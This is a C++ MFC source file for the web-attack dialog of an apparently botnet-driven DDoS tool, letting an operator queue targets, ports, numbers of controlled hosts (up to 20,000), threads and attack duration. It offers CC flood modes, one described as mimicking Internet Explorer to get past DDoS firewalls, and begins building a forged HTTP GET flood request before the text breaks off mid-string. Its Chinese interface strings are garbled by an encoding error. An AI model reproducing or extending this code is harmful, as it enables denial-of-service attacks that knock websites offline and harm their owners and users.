// WebAttackDlg.cpp : implementation file

#include "stdafx.h"
#include "Quick.h"
#include "WebAttackDlg.h"
#include "DDOSAttackDlg.h"



#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CWebAttackDlg dialog
IMPLEMENT_DYNAMIC(CWebAttackDlg, CDialog)

CWebAttackDlg::CWebAttackDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CWebAttackDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWebAttackDlg)
		// NOTE: the ClassWizard will add member initialization here

	m_SelectHost = FALSE;
	m_HostNums = 200;
	m_EndVar = 1000;
	m_Port = 80;
	m_AttckTims = 60;
	m_StartVar = 1;
	m_TargetWeb = _T("http://www.baidu.com");
	m_ThreadNums = 10;
	m_TipShow = _T("");
	//}}AFX_DATA_INIT
	TaskID = 0;
	Point = NULL;

	clr = RGB(0, 0, 0);
	m_brush.CreateSolidBrush(clr);
}


void CWebAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWebAttackDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	DDX_Control(pDX, IDC_TARGET_WEB, m_TargetCtrl);
	DDX_Control(pDX, IDC_SLIDER_TIME, m_TimeCtrl);
	DDX_Control(pDX, IDC_SLIDER_THREAD, m_ThreadCtrl);
	DDX_Control(pDX, IDC_SPIN_NUM, m_HotsNumCtrl);
	DDX_Control(pDX, IDC_COMBO_MODEL, m_ModelList);
	DDX_Control(pDX, IDC_LIST_TARGET, m_TargetList);
	DDX_Check(pDX, IDC_SELECTHOST, m_SelectHost);
	DDX_Text(pDX, IDC_HOSTNUMS, m_HostNums);
	DDV_MinMaxUInt(pDX, m_HostNums, 1, 20000);
	DDX_Text(pDX, IDC_ENDVAR, m_EndVar);
	DDV_MinMaxUInt(pDX, m_EndVar, 2, 100000);
	DDX_Text(pDX, IDC_ATTCKPORT, m_Port);
	DDV_MinMaxUInt(pDX, m_Port, 1, 65535);
	DDX_Text(pDX, IDC_ATTACKTIMES, m_AttckTims);
	DDX_Text(pDX, IDC_STARTVAR, m_StartVar);
	DDV_MinMaxUInt(pDX, m_StartVar, 1, 100000);
	DDX_Text(pDX, IDC_TARGET_WEB, m_TargetWeb);
	DDV_MaxChars(pDX, m_TargetWeb, 300);
	DDX_Text(pDX, IDC_THREADNUMS, m_ThreadNums);
	DDV_MinMaxDWord(pDX, m_ThreadNums, 1, 100);
	DDX_Text(pDX, IDC_STATIC_TIP, m_TipShow);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWebAttackDlg, CDialog)
	//{{AFX_MSG_MAP(CWebAttackDlg)
	ON_BN_CLICKED(IDC_ADDTASK, OnAddtask)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER_TIME, OnCustomdrawSliderTime)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER_THREAD, OnCustomdrawSliderThread)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_TARGET, OnRclickListTarget)
	ON_WM_CTLCOLOR()
	ON_CBN_SELCHANGE(IDC_COMBO_MODEL, OnSelchangeComboModel)
	ON_EN_CHANGE(IDC_TARGET_WEB, OnChangeTargetWeb)
	ON_EN_SETFOCUS(IDC_STARTVAR, OnSetfocusStartvar)
	ON_EN_SETFOCUS(IDC_TARGET_WEB, OnSetfocusTargetWeb)
	ON_CBN_SETFOCUS(IDC_COMBO_MODEL, OnSetfocusComboModel)
	ON_EN_SETFOCUS(IDC_THREADNUMS, OnSetfocusThreadnums)
	ON_EN_CHANGE(IDC_THREADNUMS, OnChangeThreadnums)
	ON_EN_CHANGE(IDC_ATTACKTIMES, OnChangeAttacktimes)
	ON_EN_SETFOCUS(IDC_ATTACKTIMES, OnSetfocusAttacktimes)
	ON_EN_CHANGE(IDC_ATTCKPORT, OnChangeAttckport)
	ON_EN_SETFOCUS(IDC_ATTCKPORT, OnSetfocusAttckport)
	ON_EN_CHANGE(IDC_HOSTNUMS, OnChangeHostnums)
	ON_EN_SETFOCUS(IDC_HOSTNUMS, OnSetfocusHostnums)
	ON_EN_CHANGE(IDC_STARTVAR, OnChangeStartvar)
	ON_EN_CHANGE(IDC_ENDVAR, OnChangeEndvar)
	ON_EN_SETFOCUS(IDC_ENDVAR, OnSetfocusEndvar)
	ON_BN_CLICKED(IDC_SELECTHOST, OnSelecthost)
	ON_BN_CLICKED(IDC_NEWAUTO, OnNewauto)
	ON_WM_SIZE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()
//
BEGIN_EASYSIZE_MAP(CWebAttackDlg)
	//EASYSIZE(control,left,top,right,bottom,options)
	//ES_BORDER��ʾ�ؼ���Ի���߽磨���¼�Ʊ߽磩�ľ��룻
	//ES_KEEPSIZE��ʾ�ؼ�ˮƽ/��ֱ�����ϳߴ籣�ֲ��䣻
	//�ؼ�IDֵ��ʾ��ǰ�ؼ���ָ���ؼ�֮��ľ��룻
	//ES_HCENTER��ʾ���ź�ؼ���ָ��λ����ˮƽ���У�
	//ES_VCENTER��ʾ���ź�ؼ���ָ��λ���ڴ�ֱ���У�
	EASYSIZE(IDC_STATIC_1, ES_BORDER, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_TIP, ES_BORDER, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_LIST_TARGET, ES_BORDER, ES_BORDER, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_TARGET_WEB, ES_BORDER, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_COMBO_MODEL, ES_BORDER, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_ATTCKPORT, ES_BORDER, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_HOSTNUMS, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_SPIN_NUM, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_6, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_7, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_8, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_SLIDER_THREAD, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_SLIDER_TIME, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_SELECTHOST, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_THREADNUMS, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_ATTACKTIMES, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_9, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_10, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_11, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STARTVAR, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_ENDVAR, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_ADDTASK, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
END_EASYSIZE_MAP

/////////////////////////////////////////////////////////////////////////////
// CWebAttackDlg message handlers

WORD CWebAttackDlg::GetPortNum(LPWSTR szUrl, WORD iPort, LPWSTR URL)
{
	
	CString Str = szUrl;
	Str.MakeLower();
	lstrcpy(szUrl, Str.GetBuffer(0));


	TCHAR* Test = _tcsstr(szUrl, _T(".gov"));
	if (Test != NULL)
		return 0;

	TCHAR* Point = _tcsstr(szUrl, _T("http://"));

	if (Point != NULL)
		Point += 7;
	else
		Point = szUrl;

	TCHAR* Temp = _tcsstr(Point, _T(":"));

	TCHAR TempBuffer[400] = { NULL };

	//�����ַ�������˿� ����iPort ������80 ����URL��ַ��Ӷ˿�.
	if (Temp == NULL)
	{
		if (iPort != 80)
		{
			Test = _tcsstr(Point, _T("/"));
			if (Test == NULL)
				wsprintf(URL, _T("http://%s:%u"), Point, iPort);
			else
			{
				_tcsnccpy_s(TempBuffer, Point, lstrlen(Point) - lstrlen(Test));
				wsprintf(URL, _T("http://%s:%u%s"), TempBuffer, iPort, Test);
			}

		}
		else
			wsprintf(URL, _T("http://%s"), Point);
		return iPort;
	}
	else//�����ַ�����˿� �򷵻ص�ַ�еĶ˿�! ����iPort ����.
	{
		Test = _tcsstr(Point, _T("/"));
		wsprintf(URL, _T("http://%s"), Point);
		return _tstoi(++Temp);
	}
}

WORD CWebAttackDlg::ForMatFlowAddr(LPWSTR szAddr, WORD iPort)
{
	TCHAR* Point = _tcsstr(szAddr, _T("http://"));
	if (Point)
		Point += 7;
	else
		Point = szAddr;

	TCHAR Addr[400] = { NULL };
	lstrcpy(Addr, Point);

	Point = Addr;
	TCHAR* Temp = _tcsstr(Addr, _T("/"));
	if (Temp)
		*Temp = _T('\0');

	TCHAR* Port = _tcsstr(Point, _T(":"));

	if (Port)
	{
		*Port = _T('\0');
		Port++;
		lstrcpy(szAddr, Addr);
		return _tstoi(Port);
	}

	lstrcpy(szAddr, Addr);
	return iPort;
}


void CWebAttackDlg::OnAddtask()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	//���˵�һЩ������ַ�....
	if (m_Port < 0 || m_Port >65535)
	{
		MessageBox(_T("�˿ڴ���!"));
		return;
	}
	if (m_TargetWeb.GetLength() <= 0 || m_TargetWeb.GetLength() > 400)
	{
		MessageBox(_T("Ŀ�����!"));
		return;
	}
	//����ֱ�ӰѲ������˵�...
	CString Temp;

	GetDlgItemText(IDC_COMBO_MODEL, Temp);
	if (Temp == _T("��վ: �ֻ�CC"))
	{
		if (m_TargetWeb.Find(_T("%d")) == -1)
		{
			MessageBox(_T("�ֻ�CCĿ���ַ������� %d ͨ���!"), _T("���ʧ��!"));
			return;
		}
	}

	if (Temp == _T("��վ: ����CC") || Temp == _T("��վ: ģ�� IE") || Temp == _T("��վ: �ֻ�CC"))
	{
		TCHAR TempStr[400] = { NULL };
		WORD iPort = GetPortNum(m_TargetWeb.GetBuffer(0), m_Port, TempStr);
		if (iPort == 0)
		{
			MessageBox(_T("��ַ�������Ϸ���Ϣ!"));
			return;
		}
		m_Port = iPort;
		m_TargetWeb.Format(_T("%s"), TempStr);
	}
	else
	{
		m_Port = ForMatFlowAddr(m_TargetWeb.GetBuffer(0), m_Port);
	}


	WORD iCount = m_TargetList.GetItemCount();

	m_TargetList.InsertItem(iCount, _T(""), TRUE);

	m_TargetList.SetItemText(iCount, 0, m_TargetWeb);

	Temp.Format(_T("%d"), m_Port);
	m_TargetList.SetItemText(iCount, 1, Temp);


	//�������� ���ѡ������Ѿ�ѡ������
	if (m_SelectHost)
		Temp = _T("ѡ������");
	else
		Temp.Format(_T("%d"), m_HostNums);
	m_TargetList.SetItemText(iCount, 2, Temp);


	Temp.Format(_T("%d"), m_ThreadNums);
	m_TargetList.SetItemText(iCount, 3, Temp);

	Temp.Format(_T("%d"), m_AttckTims);
	m_TargetList.SetItemText(iCount, 4, Temp);

	GetDlgItemText(IDC_COMBO_MODEL, Temp);
	m_TargetList.SetItemText(iCount, 5, Temp);

	if (Temp == _T("��վ: �ֻ�CC"))
		Temp.Format(_T("%d-%d"), m_StartVar, m_EndVar);
	else
		Temp = _T("��֧��");

	m_TargetList.SetItemText(iCount, 6, Temp);



	m_TargetList.SetItemText(iCount, 7, _T("����"));

	Temp.Format(_T("%d"), TaskID++);

	m_TargetList.SetItemText(iCount, 8, Temp);

}



BOOL CWebAttackDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	m_HotsNumCtrl.SetRange(1, 20000);
	m_HotsNumCtrl.SetPos(200);
	m_HotsNumCtrl.SetBuddy(GetDlgItem(IDC_HOSTNUMS));

	m_TimeCtrl.SetRange(1, 600);
	m_TimeCtrl.SetPos(60);

	m_ThreadCtrl.SetRange(1, 100);
	m_ThreadCtrl.SetPos(10);

	LONG lStyle;
	lStyle = GetWindowLong(m_TargetList.m_hWnd, GWL_STYLE);
	lStyle &= ~LVS_TYPEMASK;
	lStyle |= LVS_REPORT;
	SetWindowLong(m_TargetList.m_hWnd, GWL_STYLE, lStyle);
	SetWindowLong(m_TargetList.m_hWnd, GWL_STYLE, lStyle);

	DWORD dwStyle = m_TargetList.GetExtendedStyle();
	dwStyle |= LVS_EX_FULLROWSELECT;
	dwStyle |= LVS_EX_GRIDLINES;

	m_TargetList.SetExtendedStyle(dwStyle);


	m_TargetList.InsertColumn(0, _T("��ַ(Ŀ��)"), LVCFMT_LEFT, 140);
	m_TargetList.InsertColumn(1, _T("Ŀ��˿�"), LVCFMT_LEFT, 65);
	m_TargetList.InsertColumn(2, _T("��������"), LVCFMT_LEFT, 65);
	m_TargetList.InsertColumn(3, _T("�߳�����"), LVCFMT_LEFT, 65);
	m_TargetList.InsertColumn(4, _T("����ʱ��"), LVCFMT_LEFT, 65);
	m_TargetList.InsertColumn(5, _T("ģʽ"), LVCFMT_LEFT, 90);
	m_TargetList.InsertColumn(6, _T("�ֻ�CC����"), LVCFMT_LEFT, 78);
	m_TargetList.InsertColumn(7, _T("״̬"), LVCFMT_LEFT, 60);
	m_TargetList.InsertColumn(8, _T("����ID"), LVCFMT_LEFT, 60);
	m_ModelList.SetCurSel(0);

	GetDlgItem(IDC_STARTVAR)->EnableWindow(FALSE);
	GetDlgItem(IDC_ENDVAR)->EnableWindow(FALSE);

	INIT_EASYSIZE;
	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}

void CWebAttackDlg::OnCustomdrawSliderTime(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	m_AttckTims = m_TimeCtrl.GetPos();
	m_TipShow = _T("ʱ�����ǳ���Ҫ ����ƶ�ͻȻ����,����ͣ��,�쳣,�Լ���������ľ�,���޷�����,�޷�����ֹͣ����\r\n")
		_T("��ô�⽫�Ǻܿ��µ���.����ó���ʱ��,����˽��ڳ���ʱ���ʱ�������ֹͣ!.");
	SetDlgItemInt(IDC_ATTACKTIMES, m_AttckTims);
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);

	*pResult = 0;
}

void CWebAttackDlg::OnChangeAttacktimes()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	m_TipShow = _T("ʱ�����ǳ���Ҫ ����ƶ�ͻȻ����,����ͣ��,�쳣,�Լ���������ľ�,���޷�����,�޷�����ֹͣ����\r\n")
		_T("��ô�⽫�Ǻܿ��µ���.����ó���ʱ��,����˽��ڳ���ʱ���ʱ�������ֹͣ!.��λΪ����!");
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnSetfocusAttacktimes()
{
	// TODO: Add your control notification handler code here
	m_TipShow = _T("ʱ�����ǳ���Ҫ ����ƶ�ͻȻ����,����ͣ��,�쳣,�Լ���������ľ�,���޷�����,�޷�����ֹͣ����\r\n")
		_T("��ô�⽫�Ǻܿ��µ���.����ó���ʱ��,����˽��ڳ���ʱ���ʱ�������ֹͣ!.��λΪ����");
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

VOID CWebAttackDlg::ShowThreads()
{
	if (m_ThreadNums <= 20)
		m_TipShow = _T("�߳�һ��,����CPUռ��20%����,���ռ��60%����,�����������������");
	if (m_ThreadNums > 20 && m_ThreadNums < 40)
		m_TipShow = _T("�̹߳���,����CPUռ��50%����,���ռ��80%����,���������������ľ�,���ҵ���");
	if (m_ThreadNums > 40 && m_ThreadNums < 100)
		m_TipShow = _T("�̹߳���,����CPUռ��80%����,����ľ�,�����޷�����ֹͣ����,���Ҽ��������������,����,�����鿼��!");

	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}


void CWebAttackDlg::OnCustomdrawSliderThread(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	m_ThreadNums = m_ThreadCtrl.GetPos();
	ShowThreads();
	SetDlgItemInt(IDC_THREADNUMS, m_ThreadNums);

	*pResult = 0;
}
void CWebAttackDlg::OnSetfocusThreadnums()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowThreads();
}

void CWebAttackDlg::OnChangeThreadnums()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowThreads();
}
void CWebAttackDlg::OnRclickListTarget(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	CMenu m_ListMenu;
	VERIFY(m_ListMenu.CreatePopupMenu());
	m_ListMenu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("��ʼ"));
	m_ListMenu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("ֹͣ"));
	m_ListMenu.AppendMenu(MF_STRING | MF_ENABLED, 150, _T("ɾ��"));
	m_ListMenu.AppendMenu(MF_SEPARATOR, NULL);
	CPoint p;
	GetCursorPos(&p);

	//CMenu* Temp = m_ListMenu.GetSubMenu(0);

	for (int i = 0; i < m_TargetList.GetItemCount(); i++)
	{
		if (LVIS_SELECTED == m_TargetList.GetItemState(i, LVIS_SELECTED))
		{
			CString str = m_TargetList.GetItemText(i, 8);
			if (str == _T("������"))
			{
				m_ListMenu.EnableMenuItem(0, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
				m_ListMenu.EnableMenuItem(2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
			}
			else
			{
				m_ListMenu.EnableMenuItem(1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
			}
		}
	}

	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&m_ListMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:
	{
		OnStart();
	}
	break;
	case 100:
	{
		OnStop();
	}
	break;
	case 150:
	{
		OnDeleteList();
	}
	break;
	default:
		break;
	}


	m_ListMenu.DestroyMenu();

	*pResult = 0;
}


HBRUSH CWebAttackDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	if ((pWnd->GetDlgCtrlID() == IDC_STATIC_TIP) && (nCtlColor == CTLCOLOR_EDIT))
	{
		 clr = RGB(0, 255, 0);
		pDC->SetTextColor(clr);   //���ð�ɫ���ı�
		CFont font;
		font.CreatePointFont(90, _T("����"));
		CFont* pOldFont = pDC->SelectObject(&font);
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //���ú�ɫ�ı���
		font.DeleteObject();
		pDC->SelectObject(pOldFont);
		return m_brush;  //��ΪԼ�������ر���ɫ��Ӧ��ˢ�Ӿ��
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}

void CWebAttackDlg::OnSelchangeComboModel()
{
	// TODO: Add your control notification handler code here
	CString temp;
	GetDlgItemText(IDC_COMBO_MODEL, temp);

	if (temp == _T("��վ: ����CC"))
		m_TipShow = _T("����CC ������Ч�Ĳ�����վ�Ĳ�����������,�Լ���̨���ݿ��������,�ܹ���Ч�Ĳ���WEB��վ���ܳ��ܵ�ѹ��!\r\n");
	if (temp == _T("��վ: ģ�� IE"))
		m_TipShow = _T("ģ��IEģʽ ����ȫģ��IE��������͵�HTTP����,����Cookie.�ܹ���Ч��ͻ�Ʋ���DDOS����ǽ!\r\n");

	GetDlgItem(IDC_STARTVAR)->EnableWindow(FALSE);
	GetDlgItem(IDC_ENDVAR)->EnableWindow(FALSE);

	if (temp == _T("��վ: �ֻ�CC"))
	{
		m_TipShow = _T("ĳЩҳ����һ���Ĺ��� ���� bbs.xxxx.com/%d.php �����%d �����ֻ�CC���� ������ʼΪ:1 ����Ϊ:10\r\n")
			_T("��ô�⼦����� bbs.xxxx.com/1.php һֱ���� bbs.xxxx.com/10.php һ������10��ҳ�� ��WEB��վ��������Ĺ���");
		GetDlgItem(IDC_STARTVAR)->EnableWindow(TRUE);
		GetDlgItem(IDC_ENDVAR)->EnableWindow(TRUE);
	}
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnSetfocusComboModel()
{
	// TODO: Add your control notification handler code here
	CString temp = _T("��ȷ��ģʽ ��֢��ҩ ����С������ ��͵��߳� ���ӳ���������!");
	SetDlgItemText(IDC_STATIC_TIP, temp);
}

void CWebAttackDlg::OnChangeTargetWeb()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	CString temp = _T("Ŀ���������д��ȷ�����Ŀ������վ��Ŀ����뱣֤�������������Դ�!\r\n")
		_T("���ѡ�����TCPģʽ,�����л������ɷ���˴���,�м򵥵Ĳ������ӹ���!����ģʽ�޷����� �������ж�!");
	SetDlgItemText(IDC_STATIC_TIP, temp);

}

void CWebAttackDlg::OnSetfocusTargetWeb()
{
	// TODO: Add your control notification handler code here
	CString temp = _T("Ŀ���������д��ȷ�����Ŀ������վ��Ŀ����뱣֤�������������Դ�!\r\n")
		_T("���ѡ�����TCPģʽ,�����л������ɷ���˴���,�м򵥵Ĳ������ӹ���!����ģʽ�޷����� �������ж�!");
	SetDlgItemText(IDC_STATIC_TIP, temp);
}

void CWebAttackDlg::OnChangeAttckport()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	m_TipShow = _T("�˿�һ��Ҫ��ȷ,��ȷ�Ķ˿ڲ��ܸ�Ŀ�������Ĵ��!һ����վ�˿�Ϊ80");
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnSetfocusAttckport()
{
	// TODO: Add your control notification handler code here
	m_TipShow = _T("�˿�һ��Ҫ��ȷ,��ȷ�Ķ˿ڲ��ܸ�Ŀ�������Ĵ��!һ����վ�˿�Ϊ80");
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnChangeHostnums()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	m_TipShow = _T("����ķ������� ����ʵ�ֶ�Ŀ�깥�� ���͹���ʱ �������Ѿ��ڹ����е�����!\r\n")
		_T("ֻ�п��������Ž������� �����м���! ��ϸ�뿴 ��������->DDOS״̬.");

	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnSetfocusHostnums()
{
	// TODO: Add your control notification handler code here
	m_TipShow = _T("����ķ������� ����ʵ�ֶ�Ŀ�깥�� ���͹���ʱ �������Ѿ��ڹ����е�����!\r\n")
		_T("ֻ�п��������Ž������� �����м���! ��ϸ�뿴 ��������->DDOS״̬.");
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

VOID CWebAttackDlg::ShowPageNums()
{
	if (m_StartVar >= m_EndVar)
	{
		m_TipShow = _T("��ʼ���� ���� �������� ����!");
		SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
		return;
	}

	if (m_TargetWeb.Find(_T("%d")) == -1)
		m_TipShow = _T("Ŀ����� û���ҵ� %d ͨ���!!��������дĿ��!");
	else
	{
		TCHAR Buffer[400] = { NULL };
		ZeroMemory(Buffer, sizeof(Buffer));
		GetDlgItemText(IDC_TARGET_WEB, Buffer, sizeof(Buffer));

		TCHAR* Point;
		Point = _tcsstr(Buffer, _T("%d"));
		if (Point == NULL)
			return;

		TCHAR TempHead[300] = _T("");
		ZeroMemory(TempHead, sizeof(TempHead));

		_tcsnccpy_s(TempHead, Buffer, lstrlen(Buffer) - lstrlen(Point));
		//����%d...
		Point += 2;

		m_TipShow.Format(_T("Ŀ����ȷ %s%d%s -- %s%d%s ����%d��ҳ��"),
			TempHead, m_StartVar, Point, TempHead, m_EndVar, Point, (m_EndVar - m_StartVar) + 1);
	}
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnSetfocusStartvar()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();

}
void CWebAttackDlg::OnSetfocusEndvar()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();
}

void CWebAttackDlg::OnChangeStartvar()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();

}


void CWebAttackDlg::OnChangeEndvar()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();
}

void CWebAttackDlg::OnSelecthost()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	if (m_SelectHost)
	{
		GetDlgItem(IDC_HOSTNUMS)->EnableWindow(FALSE);
		GetDlgItem(IDC_SPIN_NUM)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_HOSTNUMS)->EnableWindow(TRUE);
		GetDlgItem(IDC_SPIN_NUM)->EnableWindow(TRUE);
	}

}

void CWebAttackDlg::OnNewauto()
{
	// TODO: Add your control notification handler code here

}


void CWebAttackDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	UPDATE_EASYSIZE;
}

DWORD CreateRandNum(WORD Min = 0, WORD Max = 0)
{
	SYSTEMTIME st;
	GetLocalTime(&st);
	if (Min == 0 && Max == 0)
		return GetTickCount() + st.wMinute + st.wSecond;
	else
		return (GetTickCount() + st.wMinute + st.wSecond) % ((Max - Min) + 1) + Min;
}


BOOL CWebAttackDlg::FilterCCString(LPWSTR szUrl, ATTACK& m_Attack, WORD& rPort)
{
	if (szUrl == NULL)
		return FALSE;
	if (_tcsstr(szUrl, _T("gov")))
		return FALSE;

	//strlwr(szUrl);
	CString szTemp = szUrl;
	szTemp.MakeLower();
	lstrcpy(szUrl, szTemp.GetBuffer(0));

	//�鿴�Ƿ���http://
	TCHAR* Point = _tcsstr(szUrl, _T("http://"));
	if (Point)
		Point += 7;//����http://
	else
		Point = szUrl;

	TCHAR DNS[200] = { NULL };

	TCHAR* Port = _tcsstr(Point, _T(":"));
	TCHAR* Temp = NULL;
	WORD iPort = 80;
	TCHAR* Page = _T("");

	if (Port)//˵����ַ�����˿� ����
	{
		_tcsnccpy_s(DNS, Point, lstrlen(Point) - lstrlen(Port));
		//��ȡ�˿�
		Port++;
		Temp = _tcsstr(Port, _T("/"));
		if (Temp == NULL)
		{
			if (lstrlen(Port) > 5)
			{
				MessageBox(_T("��ַ���� �޷�ʶ��!"));
				return FALSE;
			}
			else
				iPort = _tstoi(Port);
		}
		else
		{
			TCHAR strPort[6] = { NULL };
			_tcsnccpy_s(strPort, Port, lstrlen(Port) - lstrlen(Temp));
			iPort = _tstoi(strPort);
			//����ҳ��
			Page = Port;
			Page += lstrlen(strPort);
			Page++;
		}
	}
	else//��ַδ�����˿�...
	{
		Temp = _tcsstr(Point, _T("/"));
		if (Temp == NULL)//˵��ֱ����������...
		{
			lstrcpy(DNS, Point);
		}
		else
		{
			_tcsnccpy_s(DNS, Point, lstrlen(Point) - lstrlen(Temp));
			Temp++;
			Page = Temp;
		}
	}

	lstrcpy(m_Attack.Target, DNS);

	if (iPort != 80)
		wsprintf(DNS, _T("%s:%u"), DNS, iPort);

	//��������CC �����.
	TCHAR SendBuffer[] =
		_T("GET /%s HTTP/1.1\r\n")
		_T("Accept: application/x-shockwave-flash, image/gif, ")
		_T("image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, ")
		_T("application/vnd.ms-powerpoint, application/msword, application/xaml+xml, ")
		_T("application/x-ms-xbap, application/x-ms-application, application/QVOD, application/QVOD, */*\r\n")
		_T("Accept-Language: zh-cn\r\n")
		_T("Accept-Encoding: gzip, deflate\r\n")
		_T("User-Agent: Mozilla/4.0 (compatible; MSIE %u.0; Windows NT %u.1; SV1; .NET4.0C; .NET4.0E; TheWorld)\r\n")
		_T("Host: %s\r\n")
		_T("Connection: Keep-Alive\r\n")
